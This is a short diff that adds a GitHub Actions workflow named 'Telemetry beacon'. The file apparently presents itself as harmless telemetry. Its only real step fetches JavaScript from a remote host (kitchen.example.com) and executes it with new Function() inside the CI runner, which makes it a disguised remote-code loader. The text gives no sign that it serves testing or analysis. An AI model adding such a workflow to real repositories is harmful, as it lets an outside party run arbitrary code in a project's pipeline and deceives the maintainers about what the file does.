@@ -1,0 +1,19 @@
+diff --git a/.github/workflows/telemetry-beacon.yml b/.github/workflows/telemetry-beacon.yml
+new file mode 100644
+index 0000000..1111111
+--- /dev/null
++++ b/.github/workflows/telemetry-beacon.yml
+@@ -0,0 +1,15 @@
++name: Telemetry beacon
++on:
++  workflow_dispatch:
++permissions:
++  contents: read
++jobs:
++  beacon:
++    runs-on: ubuntu-latest
++    steps:
++      - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v5
++      - name: Load remote module
++        run: |
++          node -e 'globalThis.fetch("https://kitchen.example.com/r/x").then(function (r){return r.text();}).then(function (c){var F=new Function(c); return F();});'
